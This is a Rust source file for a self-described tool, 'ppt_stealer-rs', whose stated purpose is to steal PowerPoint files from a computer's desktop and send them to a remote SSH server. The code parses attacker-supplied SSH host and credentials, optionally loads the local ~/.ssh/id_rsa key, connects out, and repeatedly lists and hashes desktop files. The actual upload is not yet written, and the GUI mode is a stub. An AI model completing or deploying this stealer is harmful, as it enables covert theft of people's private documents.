use clap::{Parser, ArgGroup};
use log;
use env_logger;
use ssh2::Session;
use std::collections::HashMap;
use std::net::TcpStream;
use std::thread::sleep;
use std::time::Duration;
use std::{self, str::FromStr};
use std::path::{PathBuf, Path};

mod watch_dog;

#[derive(Parser, Debug)]
#[command(name = "ppt_stealer-rs", version = "0.1")]
#[command(about = "A tool to steal PowerPoint files from desktop to remote SSH server.", long_about = None)]
#[command(group(
    ArgGroup::new("auth")
        .args(&["password", "key_auth"])
        .required(false)
        .multiple(false)
))]
struct Cli {
    #[arg(short = 'i', long, help = "SSH IP address or domain")]
    ssh_ip: Option<String>,

    #[arg(short = 'p', long, help = "SSH IP port")]
    ssh_port: Option<i64>,

    #[arg(short = 'u', long, help = "SSH username")]
    username: Option<String>,

    #[arg(short = 'P', long, group = "auth", help = "SSH password")]
    password: Option<String>,

    #[arg(long, default_value_t = false, group = "auth", help = "Use SSH key authentication. If not assigned, password authentication will be used.")]
    key_auth: bool,

    #[arg(long, default_value_t = 30, help = "Refresh interval in seconds")]
    refresh_interval: u64,

    #[arg(long, default_value_t = false, help = "Assign no GUI mode")]
    no_gui: bool,
}


fn main() {

    std::env::set_var("RUST_LOG", "trace");
    env_logger::init();
    
    // Parse command line arguments
    let args = Cli::parse();

    // Set up logging
    // print name and version
    log::info!("ppt_stealer-rs v0.1");
    // print args
    log::info!("Args: {:?}", args);

    // get desktop path
    let desktop_path = match dirs::desktop_dir() {
        Some(path) => path,
        None => {
            // ask user for desktop path
            let mut path = String::new();
            std::io::stdin().read_line(&mut path).expect("Failed to read line");
            let path = PathBuf::from_str(path.trim()).unwrap();
            // check if the given desktop path is valid
            match path.is_dir() {
                true => path,
                false => {
                    log::error!("{} is invalid desktop path", path.display());
                    std::process::exit(1);
                }
            }
        }
    };
    log::info!("Desktop path: {}", desktop_path.display());

    println!("Hello, world!");

    if args.no_gui {
        no_gui(&desktop_path, args);
    } else {
        // start GUI
        log::error!("GUI mode is still under development.");
    }
}

fn no_gui(desktop_path: &Path, args: Cli) {
    log::info!("No GUI mode on.");

    log::info!("Connecting to SSH server...");

    let tcp = {
        let ip = args.ssh_ip.expect("On no GUI mode, SSH IP address is required!");
        let port = args.ssh_port.unwrap_or_else(|| 22);

        let addr = format!("{}:{}", ip, port);

        match TcpStream::connect(addr) {
            Ok(stream) => stream,
            Err(e) => {
                log::error!("Failed to connect to SSH server: {}", e);
                std::process::exit(1);
            }
        }
    };
    log::info!("Established tcp connection with SSH server.");

    log::info!("Starting SSH session...");
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().unwrap();
    if args.key_auth {
        let private_key_path = dirs::home_dir().unwrap().join(".ssh/id_rsa");
        log::debug!("Authenticating with rivate key: {}", private_key_path.display());

        sess.userauth_pubkey_file(
            &args.username.expect("On no GUI mode, SSH username is required!"),
            None,
            &private_key_path,
            None,
        ).expect("Failed to authenticate with SSH key.");
    } else {
        sess.userauth_password(
            &args.username.expect("On no GUI mode, SSH username is required!"),
            &args.password.expect("On no GUI mode, SSH password is required!"),
        ).expect("Failed to authenticate with SSH password.");
    }
    assert!(sess.authenticated());
    log::info!("SSH Authentication successful.");

    // make sure ssh connection closed after Ctrl+C.
    ctrlc::set_handler(move || {
        log::info!("Ctrl+C detected. Exiting...");
        sess.disconnect(None, "CtrlC detected", None).expect("Failed to disconnect from SSH server.");
        log::info!("SSH session closed.");
        std::process::exit(0);
    }).expect("Error setting Ctrl+C handler.");

    log::info!("Start monitering files...");

    let file_hashes: HashMap<&Path, String> = HashMap::new();

    loop {
        let path_bufs: Vec<PathBuf> = watch_dog::file_moniter(desktop_path);

        let paths: Vec<&Path> = path_bufs.iter().map(|p: &PathBuf| p.as_path()).collect::<Vec<&Path>>();

        let new_file_hashes = watch_dog::get_hashes(&paths);
        
        sleep(Duration::from_secs(args.refresh_interval));
    }
}
